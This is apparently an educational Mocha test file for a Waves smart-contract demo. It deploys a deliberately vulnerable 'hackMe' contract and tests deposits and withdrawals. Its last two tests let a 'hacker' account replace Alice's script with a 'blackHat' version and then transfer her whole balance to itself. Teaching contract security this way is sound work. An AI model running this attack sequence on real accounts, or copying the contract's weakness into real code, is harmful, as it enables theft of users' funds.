/* global setupAccounts, accounts, compile, file, setScript, broadcast, waitForTx, invokeScript, address, publicKey, transfer */
const assert = require("assert")
const { nodeInteraction } = require("@waves/waves-transactions")
const { toWavelets, toWaves } = require("../utils/currency")
const getNodeUrl = require("../utils/getNodeUrl")

const nodeUrl = getNodeUrl()
const accountsConfig = {
	alice: toWavelets(10),
	bob: toWavelets(10),
	hacker: toWavelets(10),
}

describe("Vulnerable smart contract", function() {
	// Deploy contract
	before(async function() {
		this.timeout(100000)

		// Allocate funds to participants
		await setupAccounts(accountsConfig)

		// Construct the setScript tx
		const script = compile(file("hackMe.ride"))
		const setScriptTx = setScript({ script }, accounts.alice)

		// Wait for tx confirmation
		await broadcast(setScriptTx)
		await waitForTx(setScriptTx.id)

		console.info(`Hackable script has been deployed (${setScriptTx.id})\n`)
	})

	it("Accepts deposits and updates data storage", async function() {
		const depositAmountWaves = 2
		const addressAlice = address(accounts.alice)
		const addressBob = address(accounts.bob)

		// Construct the invokeScript tx
		const depositTx = invokeScript(
			{
				dApp: address(accounts.alice),
				call: { function: "deposit" },
				payment: [{ assetId: null, amount: toWavelets(depositAmountWaves) }],
			},
			accounts.bob,
		)

		// Wait for tx confirmation
		await broadcast(depositTx)
		await waitForTx(depositTx.id)

		// Fetch alice's account state
		const aliceAccountState = await nodeInteraction.accountData(addressAlice, nodeUrl)

		// Check if data was written successfully
		assert.equal(aliceAccountState[addressBob].value, toWavelets(depositAmountWaves))

		console.info(
			`Bob successfully deposited ${depositAmountWaves} $WAVES to the family wallet (${depositTx.id})`,
		)
	})

	it("Allows withdrawals and updates data storage", async function() {
		const previousDepositAmountWaves = 2
		const withdrawalAmountWaves = 1
		const addressAlice = address(accounts.alice)
		const addressBob = address(accounts.bob)

		// Construct the invokeScript tx
		const withdrawalTx = invokeScript(
			{
				dApp: address(accounts.alice),
				call: {
					function: "withdraw",
					args: [{ type: "integer", value: toWavelets(withdrawalAmountWaves) }],
				},
			},
			accounts.bob,
		)

		// Wait for tx confirmation
		await broadcast(withdrawalTx)
		await waitForTx(withdrawalTx.id)

		// Fetch alice's account state
		const aliceAccountState = await nodeInteraction.accountData(addressAlice, nodeUrl)

		// Check if data was written successfully
		assert.equal(
			aliceAccountState[addressBob].value,
			toWavelets(previousDepositAmountWaves - withdrawalAmountWaves),
		)

		console.info(
			`Bob has successfully withdrawn ${withdrawalAmountWaves} $WAVES from the contract (${withdrawalTx.id})`,
		)
	})

	it("Denies withdrawals when amount is too high", async function() {
		const withdrawalAmountWaves = 5

		try {
			// Construct the invokeScript tx
			const withdrawalTx = invokeScript(
				{
					dApp: address(accounts.alice),
					call: {
						function: "withdraw",
						args: [{ type: "integer", value: toWavelets(withdrawalAmountWaves) }],
					},
				},
				accounts.bob,
			)

			// Wait for tx confirmation
			await broadcast(withdrawalTx)
			await waitForTx(withdrawalTx.id)
		} catch (err) {
			// Catch exception and compare error message to expected message
			const regex = /Error while executing account-script: Balance of \w+ is to low \(1 \$WAVES\)/
			const isExpectedErrorMessage = regex.test(err.message)
			assert.equal(isExpectedErrorMessage, true)

			console.info(
				`Bobs withdrawal of ${withdrawalAmountWaves} $WAVES from the contract was denied`,
			)
		}
	})

	it("Overwrites the smart contract with a hacked version", async function() {
		const alicePublicKey = publicKey(accounts.alice)

		// Construct the invokeScript tx
		const script = compile(file("blackHat.ride"))
		const setScriptTx = setScript(
			{ script, senderPublicKey: alicePublicKey, fee: toWavelets(0.014) },
			accounts.hacker,
		)

		// Wait for tx confirmation
		await broadcast(setScriptTx)
		await waitForTx(setScriptTx.id)

		console.info(`Hacked contract has been deployed (${setScriptTx.id})`)
	})

	it("Hacker steals funds from Alice's contract", async function() {
		const aliceSenderPublicKey = publicKey(accounts.alice)
		const aliceAddress = address(accounts.alice)
		const hackerAddress = address(accounts.hacker)
		const transferFeeWaves = 0.005

		// Fetch Alice's balance
		const aliceContractBalanceWavelets = await nodeInteraction.balance(aliceAddress, nodeUrl)
		// Calculate available funds to steal
		const availableFundsToStealWavelets =
			aliceContractBalanceWavelets - toWavelets(transferFeeWaves)

		// Construct the transfer tx
		const transferTx = transfer(
			{
				amount: availableFundsToStealWavelets,
				recipient: hackerAddress,
				// Use Alice's publicKey to create a transaction sent from her account
				senderPublicKey: aliceSenderPublicKey,
				fee: toWavelets(transferFeeWaves),
			},
			accounts.hacker,
		)

		// Wait for tx confirmation
		await broadcast(transferTx)
		await waitForTx(transferTx.id)

		console.info(
			`Hacker has successfully stolen ${toWaves(
				availableFundsToStealWavelets,
			)} $WAVES from the contract (${transferTx.id})`,
		)
	})
})
